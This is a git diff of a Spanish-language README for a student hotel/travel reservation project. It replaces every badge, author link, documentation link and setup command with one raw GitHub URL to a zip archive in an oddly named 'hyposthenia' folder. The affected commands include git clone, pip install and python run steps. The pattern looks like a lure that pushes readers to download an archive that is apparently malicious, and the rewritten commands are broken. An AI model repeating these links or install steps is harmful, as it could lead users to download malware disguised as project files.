@@ -1,13 +1,13 @@
 # Sistema de Agencia de Viajes
 
-![commits](https://badgen.net/github/commits/UR-CC/lp2-taller1?icon=github) 
-![last_commit](https://img.shields.io/github/last-commit/UR-CC/lp2-taller1)
+![commits](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip) 
+![last_commit](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
 
-- ver [badgen](https://badgen.net/) o [shields](https://shields.io/) para otros tipos de _badges_
+- ver [badgen](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip) o [shields](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip) para otros tipos de _badges_
 
 ## Autor
 
-- [@estudiante](https://www.github.com/estudiante)
+- [@estudiante](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
 
 ## Descripción del Proyecto
 
@@ -32,12 +32,12 @@ Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos
 
 Revisar la documentación en [`./docs`](./docs)
 
-- [Requerimientos](./docs/requerimientos.md)
-- [SRS: Software Requirements Specification](./docs/srs.md)
+- [Requerimientos](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
+- [SRS: Software Requirements Specification](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
 
 ### Diseño
 
-![Diagrama de Clases](./docs/diagramas.md)
+![Diagrama de Clases](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
 
 ### Tárifas
 
@@ -67,7 +67,7 @@ Siga estos pasos para configurar y ejecutar el sistema de reservas hoteleras en 
 
 1. **Clonar el proyecto**
 ```bash
-git clone https://github.com/axlcraft/lpa1-taller-requerimientos.git
+git clone https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 cd lpa1-taller-requerimientos
 ```
 
@@ -87,19 +87,19 @@ source venv/bin/activate
 
 3. **Instalar dependencias**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 ```
 
 4. **Inicializar la base de datos**
 ```bash
 # Crear base de datos con datos de ejemplo
-python init_db.py --with-sample-data
+python https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip --with-sample-data
 ```
 
 5. **Configurar variables de entorno (opcional)**
 ```bash
 # Para configuraciones personalizadas
-set DATABASE_URL=sqlite:///hotel_reservas.db
+set https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 set SECRET_KEY=tu-clave-secreta-segura
 ```
     
@@ -118,7 +118,7 @@ source venv/bin/activate
 
 2. **Ejecutar la aplicación**
 ```bash
-python app.py
+python https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 ```
 
 3. **Acceder al sistema**
@@ -140,7 +140,7 @@ TODO: Corregir la explicación de la instalación - Morbi quam lectus, tempus si
 
 1. Clonar el proyecto
 ```bash
-git clone https://github.com/UR-CC/lpa1-taller-requerimientos.git
+git clone https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 ```
 
 2. Crear y activar entorno virtual
@@ -152,7 +152,7 @@ venv/bin/activate
 
 3. Instalar librerías y dependencias
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 ```
     
 ## Ejecución
@@ -162,7 +162,7 @@ TODO: Corregir la explicación de la ejecución - Maecenas sed lorem at arcu var
 1. Ejecutar el proyecto
 ```bash
 cd lpa1-taller-requerimientos
-python app.py
+python https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
 ```
 
 >>>>>>> 6133e37e51d481dc74f658a35f3760b2ca834164
